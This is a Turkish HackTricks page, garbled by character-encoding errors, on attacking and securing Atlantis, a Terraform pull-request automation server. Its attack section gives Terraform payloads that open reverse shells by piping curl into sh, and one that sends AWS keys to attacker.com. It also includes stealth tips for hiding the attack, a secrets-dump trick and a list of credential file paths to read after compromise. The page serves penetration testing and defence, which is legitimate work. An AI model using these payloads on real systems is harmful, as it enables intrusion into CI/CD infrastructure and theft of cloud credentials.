# Atlantis GÃ¼venliÄŸi

<details>

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Temel Bilgiler

Atlantis temel olarak, terraform'Ä± git sunucunuzdaki Pull Ä°steklerinden Ã§alÄ±ÅŸtÄ±rmanÄ±za yardÄ±mcÄ± olur.

![](<../.gitbook/assets/image (161).png>)

## Yerel Laboratuvar

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) adresindeki **atlantis sÃ¼rÃ¼mleri sayfasÄ±na** gidin ve size uygun olanÄ± **indirin**.
2. **Github** kullanÄ±cÄ±nÄ±zÄ±n **repo eriÅŸimi** olan bir **kiÅŸisel belirteci** oluÅŸturun
3. `./atlantis testdrive` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n ve **atlantis ile iletiÅŸim kurabileceÄŸiniz bir demo repo** oluÅŸturacaktÄ±r.
1. 127.0.0.1:4141 adresindeki web sayfasÄ±na eriÅŸebilirsiniz

## Atlantis EriÅŸimi

### Git Sunucu Kimlik Bilgileri

**Atlantis**, **Github**, **Gitlab**, **Bitbucket** ve **Azure DevOps** gibi Ã§eÅŸitli git sunucularÄ±nÄ± destekler.\
Ancak, bu platformlardaki depolara eriÅŸmek ve iÅŸlemler gerÃ§ekleÅŸtirmek iÃ§in, bunlara bazÄ± **ayrÄ±calÄ±klÄ± eriÅŸimlerin verilmiÅŸ olmasÄ± gerekir** (en azÄ±ndan yazma izinleri).\
[**Belgeler**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional), Atlantis iÃ§in Ã¶zellikle bu platformlarda bir kullanÄ±cÄ± oluÅŸturmanÄ±zÄ± teÅŸvik eder, ancak bazÄ± kiÅŸiler kiÅŸisel hesaplarÄ±nÄ± kullanabilir.

{% hint style="warning" %}
Her durumda, bir saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan, **Atlantis hesabÄ±** Ã§ok **ilginÃ§ bir hedef olacaktÄ±r**.
{% endhint %}

### Webhooks

Atlantis, **Webhook sÄ±rlarÄ±nÄ±** isteÄŸe baÄŸlÄ± olarak kullanÄ±r, bÃ¶ylece aldÄ±ÄŸÄ± **webhook'larÄ±n** Git sunucunuzdan **geÃ§erli** olduÄŸunu doÄŸrular.

Bunu doÄŸrulamanÄ±n bir yolu, isteklerin yalnÄ±zca Git sunucunuzun IP'lerinden gelmesine izin vermek olabilir, ancak daha kolay bir yol Webhook SÄ±rrÄ± kullanmaktÄ±r.

Ã–zel bir github veya bitbucket sunucusu kullanmadÄ±kÃ§a, webhook uÃ§ noktalarÄ±nÄ± Ä°nternete aÃ§manÄ±z gerekeceÄŸini unutmayÄ±n.

{% hint style="warning" %}
Atlantis, git sunucusunun bilgileri gÃ¶nderebilmesi iÃ§in **webhook'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karacak**, bu nedenle bir saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan Ã¶nemli olabilir **onun mesaj gÃ¶nderebilir mi** Ã¶ÄŸrenmek.
{% endhint %}

### SaÄŸlayÄ±cÄ± Kimlik Bilgileri <a href="#provider-credentials" id="provider-credentials"></a>

[Belgelerden:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis, Terraform'Ä± sadece **`terraform plan` ve `apply`** komutlarÄ±nÄ± **Ã§alÄ±ÅŸtÄ±rarak** Ã§alÄ±ÅŸtÄ±rÄ±r. Yerel olarak Terraform Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda olduÄŸu gibi, Atlantis'in belirli saÄŸlayÄ±cÄ±nÄ±z iÃ§in kimlik bilgilerine ihtiyacÄ± vardÄ±r.

SaÄŸlayÄ±cÄ±nÄ±za Ã¶zgÃ¼ kimlik bilgilerini Atlantis'e nasÄ±l saÄŸlayacaÄŸÄ±nÄ±za siz karar verirsiniz:

* Atlantis [Helm ÅemasÄ±](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ve [AWS Fargate ModÃ¼lÃ¼](https://www.runatlantis.io/docs/deployment.html#aws-fargate) saÄŸlayÄ±cÄ± kimlik bilgileri iÃ§in kendi mekanizmalarÄ±na sahiptir. Belgelerini okuyun.
* Atlantis'i bir bulutta Ã§alÄ±ÅŸtÄ±rÄ±yorsanÄ±z, birÃ§ok bulutun Ã¼zerinde Ã§alÄ±ÅŸan uygulamalara bulut API eriÅŸimi verme yollarÄ± vardÄ±r, Ã¶rn:
* [AWS EC2 Roller](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) ("EC2 RolÃ¼" arayÄ±n)
* [GCE Ã–rnek Hizmet HesaplarÄ±](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* BirÃ§ok kullanÄ±cÄ± ortam deÄŸiÅŸkenleri ayarlar, Ã¶rn. `AWS_ACCESS_KEY`, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde.
* DiÄŸerleri gerekli yapÄ±landÄ±rma dosyalarÄ±nÄ± oluÅŸturur, Ã¶rn. `~/.aws/credentials`, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde.
* SaÄŸlayÄ±cÄ± kimlik bilgilerini almak iÃ§in [HashiCorp Vault SaÄŸlayÄ±cÄ±sÄ±nÄ±](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) kullanÄ±n.

{% hint style="warning" %}
**Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± konteynerin** bÃ¼yÃ¼k olasÄ±lÄ±kla, Terraform aracÄ±lÄ±ÄŸÄ±yla yÃ¶nettiÄŸi saÄŸlayÄ±cÄ±lara (AWS, GCP, Github...) ait **ayrÄ±calÄ±klÄ± kimlik bilgileri** iÃ§erecektir.
{% endhint %}

### Web SayfasÄ±

VarsayÄ±lan olarak Atlantis, **localhost'ta 4141 numaralÄ± portta** bir **web sayfasÄ± Ã§alÄ±ÅŸtÄ±racaktÄ±r**. Bu sayfa sadece atlantis uygulamasÄ±nÄ± etkinleÅŸtirmenize / devre dÄ±ÅŸÄ± bÄ±rakmanÄ±za ve depolarÄ±n plan durumunu kontrol etmenize ve kilidini aÃ§manÄ±za izin verir (ÅŸeyleri deÄŸiÅŸtirmenize izin vermez, bu yÃ¼zden Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir).

Ä°nternete aÃ§Ä±k bulamayabilirsiniz, ancak varsayÄ±lan olarak eriÅŸmek iÃ§in **kimlik bilgilerine ihtiyaÃ§ olmadÄ±ÄŸÄ±** gÃ¶rÃ¼nÃ¼yor (ve varsa, `atlantis`:`atlantis` **varsayÄ±lan** olanlardÄ±r).

## Sunucu YapÄ±landÄ±rmasÄ±

`atlantis server` yapÄ±landÄ±rmasÄ±, komut satÄ±rÄ± bayraklarÄ±, ortam deÄŸiÅŸkenleri, bir yapÄ±landÄ±rma dosyasÄ± veya Ã¼Ã§Ã¼nÃ¼n bir karÄ±ÅŸÄ±mÄ± aracÄ±lÄ±ÄŸÄ±yla belirtilebilir.

* Atlantis sunucusu tarafÄ±ndan desteklenen [**bayraklarÄ±n listesini burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* Bir yapÄ±landÄ±rma seÃ§eneÄŸini bir ortam deÄŸiÅŸkenine nasÄ±l dÃ¶nÃ¼ÅŸtÃ¼receÄŸinizi [**burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

DeÄŸerler **ÅŸu sÄ±rayla seÃ§ilir**:

1. Bayraklar
2. Ortam DeÄŸiÅŸkenleri
3. YapÄ±landÄ±rma DosyasÄ±

{% hint style="warning" %}
YapÄ±landÄ±rmada **belirli deÄŸerler** gibi ilginÃ§ deÄŸerler bulabilirsiniz, Ã¶rneÄŸin **belirteÃ§ler ve ÅŸifreler**.
{% endhint %}

### DepolarÄ±n YapÄ±landÄ±rÄ±lmasÄ±

BazÄ± yapÄ±landÄ±rmalar **depolarÄ±n nasÄ±l yÃ¶netildiÄŸini etkiler**. Ancak, **her depo iÃ§in farklÄ± ayarlarÄ±n gereklilik olabileceÄŸi** iÃ§in her depoyu belirtmenin yollarÄ± vardÄ±r. Bu Ã¶ncelik sÄ±rasÄ±dÄ±r:

1. Depo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) dosyasÄ±. Bu dosya, atlantis'in depoyu nasÄ±l iÅŸlemesi gerektiÄŸini belirtmek iÃ§in kullanÄ±labilir. Ancak, varsayÄ±lan olarak bazÄ± anahtarlar burada belirtilmeden kullanÄ±lamaz.
1. Muhtemelen `allowed_overrides` veya `allow_custom_workflows` gibi bayraklar tarafÄ±ndan izin verilmesi gerekebilir
2. [**Sunucu TarafÄ± YapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Bu, her depo iÃ§in yeni ayarlar yapÄ±landÄ±ran bir yaml'dir ve `--repo-config` bayraÄŸÄ± ile iletilir (regexler desteklenir)
3. **VarsayÄ±lan** deÄŸerler
#### PR KorumalarÄ±

Atlantis, **PR**'nin **`onaylanmasÄ±nÄ±`** baÅŸka bir kiÅŸiye bÄ±rakmak isteyip istemediÄŸinizi belirtmenize izin verir (bu, dal korumasÄ±nda ayarlanmamÄ±ÅŸ olsa bile) ve/veya **uygulanmadan Ã¶nce** **`birleÅŸtirilebilir`** olmasÄ±nÄ± saÄŸlar (dal korumalarÄ± geÃ§ildi). GÃ¼venlik aÃ§Ä±sÄ±ndan, her iki seÃ§eneÄŸin de ayarlanmasÄ± Ã¶nerilir.

EÄŸer `allowed_overrides` True ise, bu ayarlar **her projede `/atlantis.yml` dosyasÄ± ile Ã¼zerine yazÄ±labilir**.

#### Komut DosyalarÄ±

Depo yapÄ±landÄ±rmasÄ±, bir **iÅŸ akÄ±ÅŸÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesinden [**Ã¶nce**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_Ã¶n iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) ve [**sonrasÄ±nda**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_son iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) Ã§alÄ±ÅŸtÄ±rÄ±lacak komut dosyalarÄ±nÄ± **belirtebilir**.

Bu komut dosyalarÄ±nÄ± **depoda `/atlantis.yml`** dosyasÄ±nda **belirtme** seÃ§eneÄŸi bulunmamaktadÄ±r.

#### Ä°ÅŸ AkÄ±ÅŸÄ±

Depo yapÄ±landÄ±rmasÄ±nda (sunucu tarafÄ± yapÄ±landÄ±rma) [**yeni varsayÄ±lan bir iÅŸ akÄ±ÅŸÄ± belirtebilir**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) veya [**yeni Ã¶zel iÅŸ akÄ±ÅŸlarÄ± oluÅŸturabilirsiniz**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** AyrÄ±ca, oluÅŸturulan **yeni** iÅŸ akÄ±ÅŸlarÄ±na **eriÅŸebilecek** **depolarÄ± belirtebilirsiniz**.\
Daha sonra, her depo iÃ§in **atlantis.yaml** dosyasÄ±na **kullanÄ±lacak iÅŸ akÄ±ÅŸÄ±nÄ± belirtebilirsiniz**.

{% hint style="danger" %}
EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` **True** olarak ayarlanmÄ±ÅŸsa, iÅŸ akÄ±ÅŸlarÄ± her depodaki **`atlantis.yaml`** dosyasÄ±nda **belirtilebilir**. AyrÄ±ca, **`allowed_overrides`**'Ä±n ayrÄ±ca **`workflow`**'u **geÃ§ersiz kÄ±lama iÅŸ akÄ±ÅŸÄ±nÄ± belirtmesi gerekebilir**.\
Bu temelde, bu, **o depoya eriÅŸebilen her kullanÄ±cÄ±ya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest Politika KontrolÃ¼

Atlantis, plan Ã§Ä±ktÄ±sÄ±na karÅŸÄ± **sunucu tarafÄ±nda** [**conftest**](https://www.conftest.dev/) **politikalarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rmayÄ± destekler. Bu adÄ±mÄ± kullanmanÄ±n yaygÄ±n kullanÄ±m durumlarÄ± ÅŸunlarÄ± iÃ§erir:

* Bir modÃ¼l listesinin kullanÄ±mÄ±nÄ± reddetme
* Bir kaynaÄŸÄ±n oluÅŸturma zamanÄ±ndaki Ã¶zelliklerini doÄŸrulama
* Kazara kaynak silmelerini yakalama
* GÃ¼venlik risklerini Ã¶nleme (Ã¶r. gÃ¼venli baÄŸlantÄ± noktalarÄ±nÄ± genel kullanÄ±ma aÃ§ma)

NasÄ±l yapÄ±landÄ±rÄ±lacaÄŸÄ±nÄ± [**belgelerde**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) kontrol edebilirsiniz.

## Atlantis KomutlarÄ±

[**Belgelerde**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) Atlantis Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabileceÄŸiniz seÃ§enekleri bulabilirsiniz:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## SaldÄ±rÄ±lar

{% hint style="warning" %}
EÄŸer sÃ¶mÃ¼rÃ¼ sÄ±rasÄ±nda bu **hata**'yÄ± bulursanÄ±z: `Error: Error acquiring the state lock`

Ã‡Ã¶zebilirsiniz, ÅŸu ÅŸekilde Ã§alÄ±ÅŸtÄ±rarak:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Yeni PR'de YapÄ±landÄ±rma DeÄŸiÅŸikliÄŸi

EÄŸer bir depo Ã¼zerinde yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR oluÅŸturabilirsiniz. EÄŸer `atlantis plan` komutunu **Ã§alÄ±ÅŸtÄ±rabilirseniz** (veya belki otomatik olarak Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yorsa) **Atlantis sunucusu iÃ§inde RCE yapabilirsiniz**.

Bunu yapabilirsiniz [**Atlantis'Ä±n harici bir veri kaynaÄŸÄ±nÄ± yÃ¼klemesini saÄŸlayarak**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Sadece aÅŸaÄŸÄ±daki gibi bir yÃ¼kÃ¼ ekleyin `main.tf` dosyasÄ±na:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### GÃ¶rÃ¼nmez SaldÄ±rÄ±

Bu saldÄ±rÄ±yÄ± daha **gÃ¶rÃ¼nmez bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, aÅŸaÄŸÄ±daki Ã¶nerileri takip ederek:

* Terraform dosyasÄ±na doÄŸrudan rev shell eklemek yerine, rev shell iÃ§eren **harici bir kaynaÄŸÄ± yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* DÄ±ÅŸ kaynaktaki **ref** Ã¶zelliÄŸini kullanarak, **terraform rev shell kodunu bir dal iÃ§inde gizlemek** iÃ§in ÅŸuna benzer bir ÅŸey yapÄ±n: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantis'i tetiklemek iÃ§in **master'a PR oluÅŸturmak yerine**, **2 dal oluÅŸturun** (test1 ve test2) ve birinden diÄŸerine bir **PR oluÅŸturun**. SaldÄ±rÄ±yÄ± tamamladÄ±ÄŸÄ±nÄ±zda, sadece **PR'yi ve dallarÄ± kaldÄ±rÄ±n**.

### Atlantis Plan Secrets Dump

`atlantis plan` (`terraform plan`) Ã§alÄ±ÅŸtÄ±rarak **terraform tarafÄ±ndan kullanÄ±lan sÄ±rlarÄ± dÃ¶kebilirsiniz**. Terraform dosyasÄ±na ÅŸÃ¶yle bir ÅŸey ekleyerek:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis uygula RCE - Yeni PR'de Config deÄŸiÅŸikliÄŸi

EÄŸer bir depoya yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR oluÅŸturabilirsiniz. **`atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rabilirseniz Atlantis sunucusu iÃ§inde RCE yapabilirsiniz**.

Ancak genellikle bazÄ± korumalarÄ± atlatmanÄ±z gerekecektir:

* **BirleÅŸtirilebilir**: EÄŸer bu koruma Atlantis'te ayarlanmÄ±ÅŸsa, **`atlantis apply` komutunu sadece PR birleÅŸtirilebilirse Ã§alÄ±ÅŸtÄ±rabilirsiniz** (bu da demek oluyor ki dal korumasÄ±nÄ± atlatmanÄ±z gerekmektedir).
* Potansiyel [**dal korumalarÄ± atlatmalarÄ±nÄ± kontrol edin**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **OnaylÄ±**: EÄŸer bu koruma Atlantis'te ayarlanmÄ±ÅŸsa, **baÅŸka bir kullanÄ±cÄ±nÄ±n PR'yi onaylamasÄ± gerekmektedir** ki `atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rabilin.
* VarsayÄ±lan olarak, bu korumayÄ± atlatmak iÃ§in [**Gitbot token'Ä±nÄ± kÃ¶tÃ¼ye kullanabilirsiniz**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

**KÃ¶tÃ¼ niyetli Terraform dosyasÄ±nda `terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rma** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile.**\
Sadece aÅŸaÄŸÄ±daki gibi bir payload'Ä±n `main.tf` dosyasÄ±nda bulunduÄŸundan emin olmanÄ±z gerekmektedir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
### Terraform Param Enjeksiyonu

`atlantis plan` veya `atlantis apply` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken terraform altÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, atlantis Ã¼zerinden terraform'a komutlar iletmek iÃ§in aÅŸaÄŸÄ±daki gibi yorum satÄ±rÄ± ekleyebilirsiniz:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
### Ã–zel Ä°ÅŸ AkÄ±ÅŸÄ±

BazÄ± korumalarÄ± atlamaya yardÄ±mcÄ± olabilecek ortam deÄŸiÅŸkenlerini geÃ§ebileceÄŸiniz bir ÅŸeydir. Terraform ortam deÄŸiÅŸkenlerini [buradan](https://www.terraform.io/cli/config/environment-variables) kontrol edin.

**KÃ¶tÃ¼ niyetli Ã¶zel derleme komutlarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rma, `atlantis.yaml` dosyasÄ±nda belirtilen. Atlantis, `master`'Ä±n deÄŸil, Ã§ekme isteÄŸi dalÄ±ndaki `atlantis.yaml` dosyasÄ±nÄ± kullanÄ±r.\
Bu olasÄ±lÄ±k Ã¶nceki bir bÃ¶lÃ¼mde belirtilmiÅŸtir:

{% hint style="danger" %}
EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rmasÄ±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` **True** olarak ayarlanmÄ±ÅŸsa, iÅŸ akÄ±ÅŸlarÄ± her depodaki **`atlantis.yaml`** dosyasÄ±nda **belirtilebilir**. AyrÄ±ca, **`allowed_overrides`**'in ayrÄ±ca **`workflow`**'u belirtmesi gerekebilir, bÃ¶ylece kullanÄ±lacak olan iÅŸ akÄ±ÅŸÄ± **geÃ§ersiz kÄ±lÄ±nabilir**.

Bu temelde, bu, **o depoya eriÅŸebilen herhangi bir kullanÄ±cÄ±ya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Atlatma plan/uygulama korumalarÄ±

EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rmasÄ±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allowed_overrides` _ÅŸeklinde_ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir depoya **planÄ±/uygulama korumalarÄ±nÄ± deÄŸiÅŸtirerek bunlarÄ± atlamak mÃ¼mkÃ¼n olabilir**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

EÄŸer birisi **geÃ§erli pull isteklerinize** **`atlantis plan/apply` yorumlarÄ± gÃ¶nderirse,** terraformun istenmeyen ÅŸekilde Ã§alÄ±ÅŸmasÄ±na neden olacaktÄ±r.

AyrÄ±ca, eÄŸer **branch korumasÄ±nda** herhangi bir **yeni commit itildiÄŸinde PR'nin yeniden deÄŸerlendirilmesini istemeye** yÃ¶nelik bir yapÄ±landÄ±rma yapmazsanÄ±z, birisi terraform yapÄ±landÄ±rmasÄ±na **kÃ¶tÃ¼ niyetli yapÄ±landÄ±rmalar** (Ã¶nceki senaryolarÄ± kontrol edin) yazabilir, `atlantis plan/apply` Ã§alÄ±ÅŸtÄ±rabilir ve RCE elde edebilir.

Bu, Github branch korumalarÄ±ndaki **ayar** ÅŸudur:

![](<../.gitbook/assets/image (216).png>)

### Webhook Secret

EÄŸer **kullanÄ±lan webhook secret'Ä± Ã§almayÄ± baÅŸarÄ±rsanÄ±z** veya **hiÃ§bir webhook secret'Ä± kullanÄ±lmÄ±yorsa**, Atlantis webhook'unu **Ã§aÄŸÄ±rabilir** ve **atlantis komutlarÄ±nÄ± doÄŸrudan Ã§aÄŸÄ±rabilirsiniz**.

### Bitbucket

Bitbucket Cloud **webhook secret'Ä± desteklemez**. Bu, saldÄ±rganlarÄ±n Bitbucket'tan **sahte istekler yapmasÄ±na** izin verebilir. YalnÄ±zca Bitbucket IP'lerine izin verdiÄŸinizden emin olun.

* Bu, bir **saldÄ±rganÄ±n** Bitbucket'tan geldiÄŸi gibi gÃ¶rÃ¼nen **Atlantis'a sahte isteklerde bulunabileceÄŸi** anlamÄ±na gelir.
* `--repo-allowlist` belirtiyorsanÄ±z, yalnÄ±zca bu depolarla ilgili sahte isteklerde bulunabilirler, bu yÃ¼zden yapabilecekleri en bÃ¼yÃ¼k zarar kendi depolarÄ±nÄ±zda plan/apply yapmaktÄ±r.
* Bunu Ã¶nlemek iÃ§in [Bitbucket'Ä±n IP adreslerine](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) izin verin (Ã‡Ä±kÄ±ÅŸ IPv4 adreslerine bakÄ±n).

## SonrasÄ± SÄ±zma

Sunucuya eriÅŸmeyi baÅŸardÄ±ysanÄ±z veya en azÄ±ndan bir LFI elde ettiyseniz okumaya Ã§alÄ±ÅŸmanÄ±z gereken bazÄ± ilginÃ§ ÅŸeyler vardÄ±r:

* `/home/atlantis/.git-credentials` VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/atlantis.db` Daha fazla bilgi iÃ§eren VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/repos/<org_adÄ±>`_`/`_`<repo_adÄ±>/<pr_num>/<Ã§alÄ±ÅŸma_alanÄ±>/<dizin_yolu>/.terraform/terraform.tfstate` Terraform durum dosyasÄ±
* Ã–rnek: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Ortam deÄŸiÅŸkenleri
* `/proc/[2-20]/cmdline` `atlantis server`'Ä±n komut satÄ±rÄ± (duyarlÄ± veriler iÃ§erebilir)

## Hafifletmeler

### Genel Depolarda KullanmayÄ±n <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Herkes genel pull isteklerine yorum yapabilir, mevcut tÃ¼m gÃ¼venlik hafifletmelerine raÄŸmen, gÃ¼venlik ayarlarÄ±nÄ±n doÄŸru yapÄ±landÄ±rÄ±lmadan genel depolarda Atlantis Ã§alÄ±ÅŸtÄ±rmak tehlikelidir.

### `--allow-fork-prs` KullanmayÄ±n <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ã–nerilmeyen genel bir depoda Ã§alÄ±ÅŸÄ±yorsanÄ±z, `--allow-fork-prs` (varsayÄ±lan olarak false) ayarÄ±nÄ± yapmamalÄ±sÄ±nÄ±z Ã§Ã¼nkÃ¼ herkes kendi fork'undan repo'nuzdaki bir pull isteÄŸi aÃ§abilir.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis, `--repo-allowlist` bayraÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla web kancalarÄ±nÄ± kabul edeceÄŸi depolarÄ±n bir izin listesini belirtmenizi gerektirir. Ã–rneÄŸin:

* Belirli depolar: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* TÃ¼m organizasyonunuz: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise yÃ¼klemenizdeki tÃ¼m depolar: `--repo-allowlist=github.yourcompany.com/*`
* TÃ¼m depolar: `--repo-allowlist=*`. Bir webhook secret belirlemeden gÃ¼venli bir aÄŸda olmanÄ±z durumunda faydalÄ±dÄ±r ancak tehlikelidir.

Bu bayrak, Atlantis yÃ¼klemenizin kontrolÃ¼nÃ¼z dÄ±ÅŸÄ±ndaki depolarla kullanÄ±lmadÄ±ÄŸÄ±ndan emin olur. Daha fazla ayrÄ±ntÄ± iÃ§in `atlantis server --help`'e bakÄ±n.

### Terraform PlanlamasÄ±nÄ± Koruma <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

SaldÄ±rganlarÄ±n kÃ¶tÃ¼ niyetli Terraform kodlarÄ±yla pull istekleri gÃ¶ndermesi tehdit modelinizdeyse, `terraform apply` onaylarÄ± yeterli deÄŸildir. Bir `terraform plan` iÃ§inde kÃ¶tÃ¼ niyetli kod Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r, [`external` veri kaynaÄŸÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) veya kÃ¶tÃ¼ niyetli bir saÄŸlayÄ±cÄ± belirterek. Bu kod daha sonra kimlik bilgilerinizi dÄ±ÅŸarÄ±ya Ã§Ä±karabilir.

Bunu Ã¶nlemek iÃ§in ÅŸunlarÄ± yapabilirsiniz:

1. SaÄŸlayÄ±cÄ±larÄ± Atlantis gÃ¶rÃ¼ntÃ¼sÃ¼ne veya ana bilgisayara yerleÅŸtirin ve Ã¼retimde Ã§Ä±kÄ±ÅŸÄ± reddedin.
2. SaÄŸlayÄ±cÄ± kaydÄ± protokolÃ¼nÃ¼ iÃ§eride uygulayÄ±n ve genel Ã§Ä±kÄ±ÅŸÄ± reddedin, bÃ¶ylece kimin saÄŸlayÄ±cÄ± kaydÄ±na yazma eriÅŸimine sahip olduÄŸunu kontrol edersiniz.
